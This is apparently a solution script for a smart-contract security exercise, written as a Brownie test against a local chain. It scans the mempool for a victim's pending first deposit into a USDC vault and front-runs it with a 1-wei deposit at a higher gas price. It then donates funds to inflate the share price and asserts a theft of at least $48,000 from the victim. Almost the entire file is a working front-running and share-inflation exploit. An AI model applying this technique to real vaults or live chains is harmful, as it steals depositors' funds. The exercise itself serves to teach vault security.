from scripts.OPTMIZER_vaults1 import *


def test_optmizer_vault1_exploit():
    # Get all the tx's in the mempool
    # bellow commmented RPC call is just too slow Im usign txpool_content instead.
    #pendingBlock = w3.eth.get_block('pending', 'True')

    # Approve the vault for the attacker & bob
    usdc.approve(vault.address, ATTACKER_USDC_BALANCE, {'from': attacker})
    usdc.approve(vault.address, BOB_USDC_BALANCE, {'from': bob})


    #  Bob initiates a tx to be the first depositor in the vault system
    vault.deposit(BOB_USDC_BALANCE, {'from': bob, 'required_confs':0})


    # TODO: You see that bob is going to be the first depositor in the vault, with $200,000. Find his Tx
    #Get pending transactions from MemPool
    def get_pending_transactions(w3):
        ptx = w3.provider.make_request("txpool_content", [])
        ptx_from = ptx['result']['pending']
        return ptx_from

    def find_transaction_by_address(ptx_from, target_address):
        for sender, txs in ptx_from.items():
            for nonce, tx in txs.items():
                if tx['to'].lower() == target_address.lower():
                    return tx
        return None
    
    find_me_address = vault.address
    print(green,"\r[ + ] Looking for:",normal,find_me_address)
    while True:
        print("[ + ] First Attempt!")
        ptx_from = get_pending_transactions(w3)
        tx = find_transaction_by_address(ptx_from, find_me_address)

        if tx:
            print(green,"\r[ + ] Found it:", tx['to'])
            break
        else:
            print("Not yet")

    # TODO: You front-run bob so that you are the first depositor
    print("\x1b[0;32m[ * ]\x1b[0;m Got TX, $$ Bling Bling $$ time!!")

    print(green,"\r[ + ] TX-input:",normal,tx['input'])

    vault.deposit(1, {'from': attacker, 'required_confs':0, 'gas_price': int(tx['gasPrice'],16)+1, 'required_confs':0})
    #attacker.transfer(to=tx['to'], 
    #                  data=tx['input'], 
    #                  gas_price=int(tx['gasPrice'],16)+1, 
    #                  gas_limit=tx['gas'],
    #                  required_confs=0
    #                  )


    # TODO: You do something sneaky that allows you to take some of bob's funds!
    usdc.transfer(vault, Wei('100000 mwei'), {'from': attacker, 'gas_price': tx['gasPrice'], 'required_confs':0})

    w3.provider.make_request("evm_mine", [])

    # Withdraw vault balance
    attackerVaultBalance = vault.balanceOf(attacker)
    vault.withdraw(attackerVaultBalance, {'from': attacker})

    # SUCCESS CONDITIONS
    w3.provider.make_request("evm_mine", [])

    #
    txs =Wei('48000 mwei')
    # Attacker realizes at least $48,000 USDC gain
    assert usdc.balanceOf(attacker) > ATTACKER_USDC_BALANCE + txs

    # Bob withdraws his vault balance
    bobVaultBalance = vault.balanceOf(bob)
    vault.withdraw(bobVaultBalance, {'from': bob})

    # Bob realizes at least $48,000 USDC loss
    assert usdc.balanceOf(bob) < BOB_USDC_BALANCE - txs
